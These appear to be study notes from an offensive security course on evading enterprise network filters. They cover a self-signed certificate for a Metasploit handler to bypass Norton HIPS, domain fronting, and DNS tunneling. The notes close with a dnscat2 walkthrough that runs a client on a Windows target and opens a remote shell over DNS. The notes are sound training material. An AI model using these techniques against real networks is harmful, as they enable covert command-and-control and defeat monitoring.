## Network Filter Theory
There are various defense solutions in an enterprise environment to filter traffic.(Consider a comprehensive Internet edge architecture installation.)
- 1.Egress traffic relies on name resolution and edge DNS server may perform domain filtering, which deny known malicious domains
  - Most DNS filters compare requested domains to a blocklist of well-known malicious domain names. If the domain name is on the blocklist, it is filtered. 
  [OpenDNS,](https://community.opendns.com/domaintagging/) perform this action. 
  - DNS servers can integrate domain reputation lookup solution like [IPVoid](https://www.ipvoid.com/dns-reputation/), [VirtusTotal](https://www.virustotal.com/gui/home/search), and
  query multiple DNS filtering providers and make a decision about requtability of the domain.
- 2.Interal firewall generally limit traffic based on IP address and port number. For example, if organizaitons doesn't allow egress SMB traffic, the C2 will be filterd out.
- 3.SSL inspection device, often perform SSL decryption to inspect SSL-encrypted traffic and encryptd the traffic when it leave this zone.
- 4.IF traffic is still allowed, it may pass through a traffic filter, such as proxy server or an IDS, where data maybe be copied to a full packet capture device.
- 5.Route to internet

## Case Study Bypassing Norton HIPS with Custom Certificates
generate a self-signed certificate, In order to use this certificate and key with Metasploit, we must create a .pem file by simply
concatenating the key and certificate with cat.
```
kali@kali:~$ openssl req -new -x509 -nodes -out cert.crt -keyout priv.key

kali@kali:~$ cat priv.key cert.crt > nasa.pem 
```
Change the CipherString in /etc/ssl/openssl.cnf
```
CipherString=DEFAULT
```
Configure Metasploit to use newly-created certificate
```
msf5 exploit(multi/handler) > set HandlerSSLCert /home/kali/self_cert/nasa.pem
```

## Domain Fronting
Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both 
domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. More to follow.

## DNS Tunneling
In order to establish communication between two hosts using DNS traffic, we need to control
both ends of the communication: the client that makes the requests, and the DNS server. We nned to register our DNS server(attack machine/redirector) as the
authoritative server for a given target domain.

From the client, we can encapsulate data into the name field, which contains the domain name.
However, since the top-level domain is fixed, we can only encapsulate data as subdomains. These
can be up to 63 characters long but the total length of a domain can’t exceed 253 characters.

From the server side, we have much more flexibility and can return data in a variety of fields
based on the record type that was requested. An “A” record can only contain IPv4 addresses,
which means we can only store four bytes of information, but “TXT” records allow up to 64k.

one challenge in C2 communications is that if we want to send any data from the server
to the client, we can’t initiate the transfer from the server. Therefore, the malicious client
applications are designed to continuously poll the server for updated data.

For example, Clinet will poll the server. 6172657468657265 could be encapsulate command for "is there more command to run?"
```
Query: Request TXT record for "6172657468657265.ourdomain.com"
```

Now, on the DNS server side, sending command back to client, "686f73746e616d65" could be a whomai command.

```
TXT: "686f73746e616d65"
```

## DNS Tunneling with dnscat2
[dnscat2](https://github.com/iagox86/dnscat2) is a DNS tunneling utility. It can tunnel A, TXT, and NS records. Let's consider the follwing network digram.


![image](https://user-images.githubusercontent.com/24555370/145134133-776aaf38-f8ea-49c7-9e4a-9020a5859446.png)

We will configure dnsmasq DNS server to forward requests to our kali. The domain name will bne tunnel.com.

configure /etc/dnsmasq.conf file on the Ubuntu machine, Note, the IP address are point to Kali machine
```
server=/tunnel.com/kaliIP
server=/somedomain.com/KaliIP
```
restart dns
```
dns@ubuntu:~$ sudo systemctl restart dnsmasq
```

On our kali machine, we have to start dnscat2-server for our example tunnel.com domain

```
kali@kali:~$ sudo apt install dnscat2

kali@kali:~$ dnscat2-server tunnel.com
```

Now on the windows target machine

```
C:\Users\mst\Desktop> dnscat2-v0.07-client-win32.exe tunnel.com
```

Now, we have established a DNS tunnel, on the kali side, interact with the seesion using the  ```session -i [number]```, we can run an interactive shell with the ```shell``` command
```
dnscat2> session -i 1
New window created: 1
history_size (session) => 1000

command (client) 1> shell
Sent request to execute a shell
command (client) 1> New window created: 2
Shell session created!
command (client) 1> session -i 2


C:\Users\mst\Desktop>
cmd.exe (client) 2> whoami
client\mst
```

